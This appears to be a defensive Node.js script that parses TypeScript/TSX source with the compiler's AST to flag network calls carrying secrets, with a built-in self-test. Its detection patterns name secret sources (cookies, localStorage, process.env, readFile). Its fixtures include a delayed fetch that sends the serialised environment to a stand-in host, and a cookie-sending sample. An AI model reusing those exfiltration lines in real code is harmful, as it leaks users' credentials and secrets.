// Parse untrusted source as data. Never import/evaluate the source under review.
import ts from '/app/node_modules/typescript/lib/typescript.js';
import readline from 'node:readline';
import assert from 'node:assert/strict';
function analyze(row){
 try{
  const source=ts.createSourceFile(row.path,row.text,ts.ScriptTarget.Latest,true,row.path.endsWith('tsx')?ts.ScriptKind.TSX:ts.ScriptKind.TS);
  const positions=row.positions.map(p=>({...p,node:null}));const flows=[],sinks=[],env=new Set(),urls=new Set();
  function visit(node){
   const start=node.getStart(source),end=node.end;
   for(const p of positions)if(start<=p.offset&&p.offset<end)p.node=node;
   if(ts.isStringLiteralLike(node)&&/^https?:\/\//.test(node.text)){
    try{urls.add(new URL(node.text).hostname)}catch{}
   }
   if(ts.isPropertyAccessExpression(node)&&node.expression.getText(source)==='process.env')env.add(node.name.text);
   if(ts.isCallExpression(node)||ts.isNewExpression(node)){
    const name=node.expression.getText(source),args=node.arguments?.map(a=>a.getText(source))??[];
    if(/(?:^|\.)(fetch|request|send|sendBeacon|WebSocket|XMLHttpRequest)$/.test(name)){
     const text=node.getText(source);sinks.push({name,line:source.getLineAndCharacterOfPosition(start).line+1,args:args.map(a=>a.slice(0,180))});
     if(/readFile|document\.cookie|JSON\.stringify\(process\.env\)|Object\.(?:entries|values)\(process\.env\)|localStorage|sessionStorage/.test(args.join(' ')))flows.push({line:source.getLineAndCharacterOfPosition(start).line+1,text:text.slice(0,1200),assessment:'Lexical source inside sink arguments; verify actual binding and caller.'});
    }
   }
   ts.forEachChild(node,visit);
  }
  visit(source);
  const contexts=positions.map(p=>{
   const n=p.node;let f=n;
   while(f&&!ts.isFunctionLike(f))f=f.parent;
   const kind=n?ts.SyntaxKind[n.kind]:'trivia';
   return {rule:p.rule,offset:p.offset,kind,token:n?.getText(source).slice(0,140),functionName:f?.name?.getText(source)??(f?'anonymous':'module'),context:row.text.slice(Math.max(0,p.offset-80),p.offset+220)};
  });
  return {path:row.path,sha256:row.sha256,parseErrors:source.parseDiagnostics.map(d=>d.code),contexts,directFlowCandidates:flows,networkCalls:sinks,environmentKeys:[...env],literalNetworkHosts:[...urls],limits:'AST location and lexical argument checks only; not interprocedural taint proof.'};
 }catch(e){return {path:row.path,error:String(e)};}
}
if(process.argv.includes('--self-test')){
 const row=text=>({path:'fixture.tsx',text,positions:[],sha256:'fixture'});
 const direct=analyze(row('setTimeout(()=>fetch("https://example.invalid",{body:JSON.stringify(process.env)}),86400000)'));
 assert.equal(direct.directFlowCandidates.length,1);
 assert.deepEqual(direct.literalNetworkHosts,['example.invalid']);
 const data=analyze(row('const harmless="fetch(url, {body:document.cookie})"; // fetch(url,{body:readFile(x)})'));
 assert.equal(data.networkCalls.length,0);
 assert.equal(data.directFlowCandidates.length,0);
 const alias=analyze(row('const payload=document.cookie;fetch(url,{body:payload})'));
 assert.equal(alias.networkCalls.length,1);assert.equal(alias.directFlowCandidates.length,0); // Explicit known limitation.
 const text='const emoji="😀"; const node=<button onClick={()=>fetch("/api/chat")}/>;';
 const syntax=analyze({...row(text),positions:[{rule:'fixture',offset:text.indexOf('button')}]});
 assert.equal(syntax.parseErrors.length,0);assert.equal(syntax.contexts[0].token,'button');
 assert.ok(analyze(row('const = ;')).parseErrors.length);
 console.log('PASS direct delayed flow, inert strings/comments, alias limitation, TSX/UTF-16 positions, parse failure');
}else{
 const lines=readline.createInterface({input:process.stdin,crlfDelay:Infinity});
 for await(const line of lines){const result=analyze(JSON.parse(line));console.log(JSON.stringify(result));if(result.error||result.parseErrors.length)process.exitCode=2;}
}
